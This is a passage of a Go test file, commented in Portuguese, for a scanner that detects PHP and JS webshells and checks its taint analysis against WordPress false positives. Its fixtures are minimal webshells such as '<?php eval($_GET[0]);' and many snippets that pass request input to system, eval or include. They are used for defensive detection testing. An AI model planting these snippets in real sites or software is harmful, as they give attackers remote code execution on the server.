	for _, cs := range f.CodigoSuspeito {
		if hasSuffix(cs.Path, "consultoria/app/bootstrap.php") {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("BFS tinha de achar o webshell RASO antes de a árvore de dados "+
			"funda esgotar o orçamento — achados: %+v", f.CodigoSuspeito)
	}
}

// --ignore: o operador exclui uma árvore da varredura, e a exclusão é
// DECLARADA. Ignorar /data/xmls tira o que está sob ela E não pega /data/xmlsX
// (a fronteira é de componente, não de prefixo de string).
func TestIgnoreExcluiArvoreEDeclara(t *testing.T) {
	raiz := t.TempDir()
	must := func(p string) {
		t.Helper()
		if err := os.MkdirAll(filepathDir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("<?php eval($_GET[0]);"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	must(raiz + "/data/app/a.php")       // fica
	must(raiz + "/data/xmls/deep/b.php") // excluído por --ignore
	must(raiz + "/data/xmlsX/c.php")     // NÃO casa /data/xmls (fronteira de componente)

	e := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e.Close()
	e.Ignorar([]string{"/data/xmls"})
	f := &Facts{}
	collectCodigo(f, e)

	achou := map[string]bool{}
	for _, cs := range f.CodigoSuspeito {
		achou[cs.Path] = true
	}
	if !achou["/data/app/a.php"] {
		t.Errorf("o que NÃO foi ignorado tinha de ser achado: %+v", f.CodigoSuspeito)
	}
	if achou["/data/xmls/deep/b.php"] {
		t.Errorf("--ignore /data/xmls tinha de excluir o que está embaixo: %+v", f.CodigoSuspeito)
	}
	if !achou["/data/xmlsX/c.php"] {
		t.Errorf("/data/xmlsX NÃO é /data/xmls — a fronteira é de componente: %+v", f.CodigoSuspeito)
	}
	// e a exclusão é DECLARADA, nunca silenciosa:
	msgs := strings.Join(f.PersistDenied["codigo"], " | ")
	if !strings.Contains(msgs, "--ignore") || !strings.Contains(msgs, "/data/xmls") {
		t.Errorf("o --ignore tinha de virar lacuna declarada: %q", msgs)
	}
}

// --all-fs: a varredura anda a FS montada INTEIRA (a partir de /), não só os web
// roots. É o que acha um webshell num docroot fora da lista estática — um Alias
// de Apache, um vhost em /home/cliente, um caminho exótico.
func TestAllFSAlcancaForaDosWebRoots(t *testing.T) {
	raiz := t.TempDir()
	must := func(p string) {
		t.Helper()
		if err := os.MkdirAll(filepathDir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("<?php eval($_GET[0]);"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// um docroot FORA de codigoRaizes (não é /var/www, /data, /opt, …):
	must(raiz + "/clientes/site/public/shell.php")

	// sem --all-fs: não está sob web root nenhum, não é achado
	e1 := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e1.Close()
	f1 := &Facts{}
	collectCodigo(f1, e1)
	for _, cs := range f1.CodigoSuspeito {
		if hasSuffix(cs.Path, "clientes/site/public/shell.php") {
			t.Fatalf("sem --all-fs, um caminho fora dos web roots não deveria ser varrido: %+v", f1.CodigoSuspeito)
		}
	}

	// com --all-fs: a FS inteira é varrida, o webshell aparece
	e2 := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e2.Close()
	e2.CodigoTudo = true
	f2 := &Facts{}
	collectCodigo(f2, e2)
	var achou bool
	for _, cs := range f2.CodigoSuspeito {
		if hasSuffix(cs.Path, "clientes/site/public/shell.php") {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("--all-fs tinha de alcançar o docroot fora da lista: %+v", f2.CodigoSuspeito)
	}
}

// A precisão de taint da 5ª rodada, medida contra WordPress core e o review:
// propagação var→var (FN), coerção numérica (sanitizador provável), callback
// indexado por registro (FP do wp-admin), guard in_array com OR (FN), e a
// chamada dinâmica do JS (que não é RCE).

// Propagação: `request -> var -> var -> sink` é fluxo, e passava. `$x=f($x)`
// MANTÉM taint (webshell base64), só coerção numérica limpa.
func TestPropagacaoDeTaintEntreVariaveis(t *testing.T) {
	crit := map[string]string{
		"alias simples":    "<?php\n$a=$_GET['cmd'];\n$b=$a;\nsystem($b);",
		"alias em cadeia":  "<?php\n$a=$_POST['c'];\n$b=$a;\n$c=$b;\nsystem($c);",
		"decode preserva":  "<?php\n$x=$_POST['x'];\n$x=base64_decode($x);\neval($x);",
		"funcao nao limpa": "<?php\n$x=$_GET['x'];\n$x=str_rot13($x);\nsystem($x);",
	}
	for n, src := range crit {
		if !tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: fluxo request->var->var->sink É crítico: %+v", n, analisarConteudo(src, "php"))
		}
	}
	naoCrit := map[string]string{
		// reatribuído a valor limpo
		"limpo literal": "<?php\n$x=$_GET['x'];\n$x='date';\nsystem($x);",
		// coerção numérica prova que virou número — mata injeção
		"intval":        "<?php\n$id=intval($_GET['id']);\ninclude(\"p$id.php\");",
		"number_format": "<?php\n$x=$_GET['n'];\n$x=number_format($x,0,\"\",\"\");\neval($x);",
		"cast int":      "<?php\n$n=(int)$_GET['n'];\nsystem($n);",
	}
	for n, src := range naoCrit {
		if tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: valor limpo/numérico NÃO é crítico: %+v", n, analisarConteudo(src, "php"))
		}
	}
}

// Callback indexado por REGISTRO (`$reg[$_GET]`) é dispatch, não RCE — o FP do
// wp-admin/admin.php do WordPress core. Mas o request DIRETO no callable é RCE.
func TestCallbackIndexadoPorRegistro(t *testing.T) {
	wp := "<?php\n$importer=$_GET['import'];\nif(!isset($wp_importers[$importer])||!is_callable($wp_importers[$importer][2])){exit;}\ncall_user_func($wp_importers[$importer][2]);"
	if tem(analisarConteudo(wp, "php"), 2, "") {
		t.Errorf("call_user_func sobre registro indexado por request é dispatch, não RCE: %+v", analisarConteudo(wp, "php"))
	}
	if !tem(analisarConteudo(wp, "php"), 1, "dispatch") {
		t.Errorf("mas continua merecendo leitura (tier 1): %+v", analisarConteudo(wp, "php"))
	}
	// o callable DIRETO do request continua RCE:
	for _, src := range []string{
		`<?php call_user_func($_GET['f'], $a);`,
		`<?php $fn=$_GET['f']; call_user_func($fn);`,
		`<?php call_user_func("action".$_POST['a']);`, // WSO
	} {
		if !tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("callable derivado direto do request É RCE: %q -> %+v", src, analisarConteudo(src, "php"))
		}
	}
}

// in_array sob OR não é guard: o atacante entra pelo outro lado do `||`.
func TestInArrayComOrNaoRebaixa(t *testing.T) {
	src := "<?php\n$fn=$_GET['fn'];\nif(in_array($fn,['a','b']) || $_GET['bypass']){ $fn(); }"
	if !tem(analisarConteudo(src, "php"), 2, "") {
		t.Errorf("in_array || bypass NÃO é guard, continua RCE: %+v", analisarConteudo(src, "php"))
	}
	// mas o in_array sozinho continua rebaixando:
	ok := "<?php\n$fn=$_GET['fn'];\nif(in_array($fn,['a','b'],true)){ $fn(); }"
	if tem(analisarConteudo(ok, "php"), 2, "") {
		t.Errorf("in_array sozinho ainda é guard: %+v", analisarConteudo(ok, "php"))
	}
}

// JS: `fn()` onde fn é string do request NÃO é RCE (string não é chamável).
func TestJSChamadaDinamicaNaoEhCritica(t *testing.T) {
	if tem(analisarConteudo("const fn = req.query.fn;\nfn();", "js"), 2, "") {
		t.Error("chamada dinâmica de variável em JS não é RCE (string não roda)")
	}
	// mas os sinks reais de JS continuam:
	if !tem(analisarConteudo("eval(req.body.payload)", "js"), 2, "") {
		t.Error("eval(req.body) em JS continua crítico")
	}
}

// wp-admin/plugins.php: `$s(` dentro de `'%2$s (...'` (aspa simples) não é
// chamada — a visão de taint apaga o interior da aspa simples.
func TestPlaceholderSprintfNaoEhChamadaDinamica(t *testing.T) {
	src := "<?php\n$s = $_REQUEST['s'];\necho sprintf('%1$s by %2$s (x)', $a, $b);"
	if tem(analisarConteudo(src, "php"), 2, "") {
		t.Errorf("$s dentro de string de formato não é chamada dinâmica: %+v", analisarConteudo(src, "php"))
	}
}

// validate_file/validate_plugin do WordPress rebaixam um include de LFI
// arbitrário para confinado — o último FP recorrente do wp-admin (admin.php:192,
// update.php:87). Escopo estrito: SÓ include/require, e SÓ quando o validador
// aparece sobre a var. system/eval sobre a mesma var, e include sem validador,
// seguem críticos.
func TestValidateFileRebaixaSoOInclude(t *testing.T) {
	naoCrit := map[string]string{
		"admin.php:192":   "<?php\n$importer=$_GET['import'];\nif(validate_file($importer)){wp_redirect('x');exit;}\ninclude(ABSPATH.\"wp-admin/import/$importer.php\");",
		"validate_plugin": "<?php\n$pl=$_GET['plugin'];\nif(validate_plugin($pl)){exit;}\ninclude(WP_PLUGIN_DIR.'/'.$pl);",
	}
	for n, src := range naoCrit {
		if tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: include de caminho validado é confinado, não crítico: %+v", n, analisarConteudo(src, "php"))
		}
	}
	crit := map[string]string{
		"include sem validador (LFI real)": "<?php\n$p=$_GET['page'];\ninclude(\"pages/$p.php\");",
		"system sobre var validada":        "<?php\n$c=$_GET['c'];\nif(validate_file($c)){exit;}\nsystem($c);",
		"eval sobre var validada":          "<?php\n$c=$_GET['c'];\nif(validate_file($c)){exit;}\neval($c);",
	}
	for n, src := range crit {
		if !tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: validate_file NÃO sanitiza isto, continua crítico: %+v", n, analisarConteudo(src, "php"))
		}
	}
}

// A varredura para na profundidade-teto, e isso é DECLARADO — não pode sumir em
// silêncio, senão "nenhum backdoor" quando o que houve foi não descer.
func TestProfundidadeViraLacunaDeclarada(t *testing.T) {
	salvo := maxCodigoDepth
	maxCodigoDepth = 2
	defer func() { maxCodigoDepth = salvo }()

	raiz := t.TempDir()
	fundo := raiz + "/data/a/b/c/d/shell.php" // mais fundo que 2 níveis
	if err := os.MkdirAll(filepathDir(fundo), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(fundo, []byte("<?php eval($_GET[0]);"), 0o644); err != nil {
		t.Fatal(err)
	}
	e := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e.Close()
	f := &Facts{}
	collectCodigo(f, e)

	msgs := strings.Join(f.PersistDenied["codigo"], " | ")
	if !strings.Contains(msgs, "não desceu além") {
		t.Errorf("a profundidade-teto tinha de virar lacuna declarada, veio: %q", msgs)
	}
}

// Regressão: uma FONTE literal em string (php://input, o corpo do POST que
// webshell lê) tem de ser vista mesmo em ASPA SIMPLES. A visão de taint apaga
// string SÓ para a chamada dinâmica `$var(`; fonte fica visível.
func TestFonteLiteralEmStringVisivel(t *testing.T) {
	crit := []string{
		"<?php\n$x=file_get_contents('php://input');\neval($x);",
		"<?php\n$x=file_get_contents(\"php://input\");\nsystem($x);",
	}
	for _, src := range crit {
		if !tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("php://input é fonte remota, tem de sair mesmo em string: %q -> %+v", src, analisarConteudo(src, "php"))
		}
	}
	// e o FP que a visão-de-dyn resolve continua resolvido:
	fp := "<?php\n$s=$_REQUEST['s'];\necho sprintf('%1$s by %2$s (x)',$a,$b);"
	if tem(analisarConteudo(fp, "php"), 2, "") {
		t.Errorf("$s dentro de '%%1$s (' não é chamada dinâmica: %+v", analisarConteudo(fp, "php"))
	}
}

// call_user_func(array($obj, $req['metodo'])) é dispatch de MÉTODO num objeto
// FIXO — o request escolhe só o nome do método (como $obj->$m()), não a função.
// Foi o FP do spellchecker do TinyMCE. Mas se o OBJETO também vem do request,
// é execução arbitrária e segue crítico.
func TestCallableArrayMethodDispatch(t *testing.T) {
	if tem(analisarConteudo("<?php\n$in=$_POST;\ncall_user_func_array(array($spellchecker,$in['method']),$in['params']);", "php"), 2, "") {
		t.Error("array($obj_fixo, $req[metodo]) é dispatch de método, não RCE")
	}
	crit := []string{
		"<?php call_user_func_array(array($_GET['c'],$_GET['m']),array());", // objeto do request
		"<?php call_user_func($_GET['f']);",                                 // função do request
	}
	for _, src := range crit {
		if !tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("objeto/função DO request continua RCE: %q -> %+v", src, analisarConteudo(src, "php"))
		}
	}
}

// FAIL-CLOSED do validate_file (P0 do review): só rebaixa o include se o
// validador estiver num gate que SAI. Resultado ignorado, ou if sem saída, NÃO
// prova que a entrada inválida barra o sink — segue crítico.
func TestValidateFileExigeGateComSaida(t *testing.T) {
	crit := map[string]string{
		"resultado ignorado": "<?php\n$p=$_GET['page'];\nvalidate_file($p);\ninclude($p);",
		"if sem saída":       "<?php\n$p=$_GET['page'];\nif(validate_file($p)){ error_log('x'); }\ninclude($p);",
	}
	for n, src := range crit {
		if !tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: sem gate provado, o include segue crítico: %+v", n, analisarConteudo(src, "php"))
		}
	}
	naoCrit := map[string]string{
		"gate com exit":   "<?php\n$p=$_GET['page'];\nif(validate_file($p)){exit;}\ninclude($p);",
		"gate com return": "<?php\nfunction f($p){ if(validate_file($p)){return;} include($p); }",
	}
	for n, src := range naoCrit {
		if tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: gate que sai confina o include: %+v", n, analisarConteudo(src, "php"))
		}
	}
}

// in_array só rebaixa se for condição NECESSÁRIA: qualquer ||/or/xor na condição
// inteira (antes OU depois do in_array) deixa o corpo alcançável sem a allowlist.
func TestInArrayCondicaoInteiraSemDisjuncao(t *testing.T) {
	crit := map[string]string{
		"OR antes":   "<?php\n$fn=$_GET['fn'];\nif($_GET['b'] || in_array($fn,['a'])){ $fn(); }",
		"or textual": "<?php\n$fn=$_GET['fn'];\nif($_GET['x'] or in_array($fn,['a'])){ $fn(); }",
		"xor":        "<?php\n$fn=$_GET['fn'];\nif(in_array($fn,['a']) xor $_GET['x']){ $fn(); }",
	}
	for n, src := range crit {
		if !tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: disjunção quebra o guard, segue RCE: %+v", n, analisarConteudo(src, "php"))
		}
	}
	naoCrit := map[string]string{
		"sozinho": "<?php\n$fn=$_GET['fn'];\nif(in_array($fn,['a'],true)){ $fn(); }",
		"com AND": "<?php\n$fn=$_GET['fn'];\nif(in_array($fn,['a']) && $y){ $fn(); }",
	}
	for n, src := range naoCrit {
		if tem(analisarConteudo(src, "php"), 2, "") {
			t.Errorf("%s: in_array necessário rebaixa: %+v", n, analisarConteudo(src, "php"))
		}
	}
}
